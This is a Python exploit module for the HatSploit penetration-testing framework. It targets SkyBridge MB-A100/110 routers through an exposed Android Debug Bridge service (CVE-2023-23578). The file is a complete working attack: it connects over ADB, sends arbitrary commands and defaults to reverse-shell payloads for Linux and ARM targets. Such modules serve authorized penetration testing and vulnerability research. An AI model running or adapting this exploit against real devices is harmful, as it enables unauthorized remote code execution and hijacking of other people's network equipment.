"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import ADB


class HatSploitModule(Module, Handler, ADB):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "SkyBridge MB-A100/110 Remote Code Execution",
            'Module': "exploit/linux/skybridge/100_110_code_execution",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
            ],
            'Description': (
                "SkyBridge MB-A100/110 firmware <= 4.2.0 has an Android Debug Bridge "
                "service exposed allowing attacker to execute arbitrary commands."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "SkyBridge MB-A100 - firmware <= 4.2.0",
                "SkyBridge MB-A110 - firmware <= 4.2.0",
            ],
            'Payload': {
                PayloadInlineMixin: {
                    'Value': "unix/generic/bash_reverse_tcp",
                    'Platform': [OS_LINUX, OS_UNIX],
                    'Arch': [ARCH_GENERIC]
                },
                PayloadDropMixin: {
                    'Value': "linux/armle/shell_reverse_tcp",
                    'Platform': [OS_LINUX, OS_UNIX],
                    'Arch': [ARCH_ARMLE],
                }
            },
            'References': [
                {'URL': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23578'},
                {'URL': 'https://www.seiko-sol.co.jp/products/skybridge/skybridge_download/mb-a100/'},
                {'CVE': '2023-23578'}
            ],
            'DisclosureDate': "2023-01-01",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [RELIABLE_SESSION],
                'SideEffects': [],
            }
        })

        self.port.visible = False
        self.host.description = "SkyBridge host."

    def run(self):
        client = self.open_adb()
        client.connect()

        self.module_handle(
            sender=client.send_command,
        )

        client.disconnect()
